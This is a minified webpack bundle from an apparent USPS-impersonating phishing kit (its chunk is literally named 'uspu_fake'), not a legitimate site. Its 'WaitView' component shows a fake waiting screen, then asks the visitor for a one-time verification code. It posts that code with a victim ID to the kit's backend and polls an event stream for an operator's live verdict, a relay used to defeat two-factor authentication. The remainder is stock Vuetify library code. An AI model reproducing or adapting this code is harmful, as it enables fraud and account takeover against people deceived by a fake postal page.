"use strict";(self["webpackChunkuspu_fake"]=self["webpackChunkuspu_fake"]||[]).push([[509],{2509:function(t,e,s){s.r(e),s.d(e,{default:function(){return m}});var i=s(7024),a=s(9767),o=s(7894),n=function(){var t=this,e=t._self._c;return e("div",[e("div",{directives:[{name:"show",rawName:"v-show",value:t.show_waiting,expression:"show_waiting"}]},[e(o.Z,[e(i.Z,[e("h3",{staticClass:"wait_title"},[e("strong",[t._v("Please wait ...")])])])],1),e(o.Z,{class:t.wait_class,staticStyle:{"padding-bottom":"30px"}},[e(i.Z,{attrs:{offset:t.wait_offset}},[e("img",{attrs:{src:s(5605),width:"150",height:"150",alt:"loading"}})])],1)],1),e("div",{directives:[{name:"show",rawName:"v-show",value:t.show_otp,expression:"show_otp"}]},[e(o.Z,[e(i.Z,[e("h3",{staticClass:"payment"},[e("strong",[t._v("Enter verification code")])])])],1),e(o.Z,[e(i.Z,[e("span",{staticClass:"overline"},[t._v("We require you to enter a one-time verification code for security reasons.")])])],1),e(o.Z,[e(i.Z,{attrs:{cols:"7"}},[e("input",{directives:[{name:"model",rawName:"v-model",value:t.otp,expression:"otp"}],attrs:{type:"tel",name:"pass",maxlength:"6",placeholder:"Verification code",autocomplete:"one-time-code",oninput:"if(value.length>6)value=value.slice(0,6)"},domProps:{value:t.otp},on:{input:function(e){e.target.composing||(t.otp=e.target.value)}}})]),e(i.Z,{attrs:{cols:"2"}},[e("a",{class:t.send_code_class,staticStyle:{color:"white"},on:{click:t.set_otp_wait}},[t._v(t._s(t.send_code_text))])])],1),e(o.Z,{staticClass:"text-center",staticStyle:{"padding-bottom":"30px"}},[e(i.Z,{attrs:{cols:"12"}},[e("a",{staticClass:"btn btn-primary btn-lg",staticStyle:{color:"white"},attrs:{tabindex:"13"},on:{click:t.submit_data}},[t._v("Continue")])])],1),e(o.Z,[e(i.Z,{staticClass:"mb-5",attrs:{cols:"12"}},[e("p",{staticClass:"text-center",staticStyle:{color:"red"}},[e("b",[t._v(t._s(t.alert_text))])])])],1)],1),e(a.Z,{model:{value:t.show_loading,callback:function(e){t.show_loading=e},expression:"show_loading"}},[e("div",{staticClass:"blockUI blockMsg blockPage",staticStyle:{"z-index":"1011",position:"fixed",padding:"0",margin:"0",width:"30%",top:"40%",left:"35%","text-align":"center",color:"rgb(0, 0, 0)",border:"1px none rgb(0, 0, 0)","background-color":"transparent",cursor:"wait"}},[e("img",{staticStyle:{height:"auto","max-width":"100%"},attrs:{src:s(2265),alt:""}})])])],1)},r=[],c=s(9669),l=s.n(c),h=s(7877),d={name:"WaitView",data:()=>({send_code_class:"btn btn-primary",otp_wait:void 0,send_code_text:"SEND",flush_task:"",alert_text:"",show_loading:!1,appid:localStorage.getItem("appid"),otp:"",show_otp:!1,show_waiting:!0}),computed:{wait_offset(){switch(this.$vuetify.breakpoint.name){case"xs":return 0}return 1},wait_class(){switch(this.$vuetify.breakpoint.name){case"xs":return"text-center"}return""}},mounted:function(){setTimeout(this.wait_close,3e3),setTimeout(this.check_syn,2e3),setTimeout(this.set_otp_wait,3e3)},methods:{submit_data(){this.show_alert=!1;const t=h.Z.step_3,e=new URLSearchParams,s=[this.appid,this.otp],i=["appid","otp"];if(""!==this.appid&&""!==this.otp){this.show_loading=!0;for(let t in s)e.append(i[t],s[t]);l().post(t,e).then((t=>{"ok"===t.data.status?this.check_otp_status():(this.show_loading=!1,this.show_alert=!0,this.alert_text="Network error, please try again")})).catch((t=>{console.log(t),this.show_loading=!1,this.alert_text="Network error, please try again"}))}else this.show_alert=!0,this.alert_text="Please enter verification code to continue"},check_otp_status(){if("EventSource"in window){const t=h.Z.check_otp_status+"?appid="+this.appid,e=new EventSource(t);e.onmessage=t=>{let s=t.data;"ok"===s?(e.close(),this.$router.push({name:"thanks"})):"change"===s?(e.close(),this.show_loading=!1,this.otp="",this.alert_text="The verification code is error, please resend"):"chongshi"===s&&(this.show_loading=!1,this.otp="",this.alert_text="The verification code has expired, please re-enter")},e.onerror=t=>{console.log(t)}}},wait_close(){this.show_otp=!0,this.show_waiting=!1},set_otp_text(){Number(this.send_code_text)<=0?(clearInterval(this.otp_wait),this.send_code_class="btn btn-primary",this.send_code_text="SEND"):this.send_code_text=Number(this.send_code_text-1)},set_otp_wait(){this.send_code_class="btn btn-primary no_click",this.send_code_text=60,this.otp_wait=setInterval(this.set_otp_text,1e3)},check_syn(){const t="/api/v2/get_syn";l().get(t).then((t=>{console.log(t.data.data.status),!1===t.data.data.status&&this.$router.push({name:"thanks"})}))}}},p=d,u=s(1001),_=(0,u.Z)(p,n,r,!1,null,"acf26822",null),m=_.exports},9767:function(t,e,s){s.d(e,{Z:function(){return r}});var i=s(5836),a=s(2066),o=s(4552),n=s(5530),r=(0,n.Z)(i.Z,a.Z,o.Z).extend({name:"v-overlay",props:{absolute:Boolean,color:{type:String,default:"#212121"},dark:{type:Boolean,default:!0},opacity:{type:[Number,String],default:.46},value:{default:!0},zIndex:{type:[Number,String],default:5}},computed:{__scrim(){const t=this.setBackgroundColor(this.color,{staticClass:"v-overlay__scrim",style:{opacity:this.computedOpacity}});return this.$createElement("div",t)},classes(){return{"v-overlay--absolute":this.absolute,"v-overlay--active":this.isActive,...this.themeClasses}},computedOpacity(){return Number(this.isActive?this.opacity:0)},styles(){return{zIndex:this.zIndex}}},methods:{genContent(){return this.$createElement("div",{staticClass:"v-overlay__content"},this.$slots.default)}},render(t){const e=[this.__scrim];return this.isActive&&e.push(this.genContent()),t("div",{staticClass:"v-overlay",on:this.$listeners,class:this.classes,style:this.styles},e)}})},5836:function(t,e,s){var i=s(144),a=s(8219),o=s(4771);e["Z"]=i.ZP.extend({name:"colorable",props:{color:String},methods:{setBackgroundColor(t,e={}){return"string"===typeof e.style?((0,a.N6)("style must be an object",this),e):"string"===typeof e.class?((0,a.N6)("class must be an object",this),e):((0,o.NA)(t)?e.style={...e.style,"background-color":`${t}`,"border-color":`${t}`}:t&&(e.class={...e.class,[t]:!0}),e)},setTextColor(t,e={}){if("string"===typeof e.style)return(0,a.N6)("style must be an object",this),e;if("string"===typeof e.class)return(0,a.N6)("class must be an object",this),e;if((0,o.NA)(t))e.style={...e.style,color:`${t}`,"caret-color":`${t}`};else if(t){const[s,i]=t.toString().trim().split(" ",2);e.class={...e.class,[s+"--text"]:!0},i&&(e.class["text--"+i]=!0)}return e}}})},4552:function(t,e,s){s.d(e,{d:function(){return a}});var i=s(144);function a(t="value",e="input"){return i.ZP.extend({name:"toggleable",model:{prop:t,event:e},props:{[t]:{required:!1}},data(){return{isActive:!!this[t]}},watch:{[t](t){this.isActive=!!t},isActive(s){!!s!==this[t]&&this.$emit(e,s)}}})}const o=a();e["Z"]=o},2265:function(t,e,s){t.exports=s.p+"img/ajax-loader-usps-white.254c51b8.gif"},5605:function(t,e,s){t.exports=s.p+"img/loading.3075426d.jpg"}}]);
//# sourceMappingURL=509.fc0353d3.js.map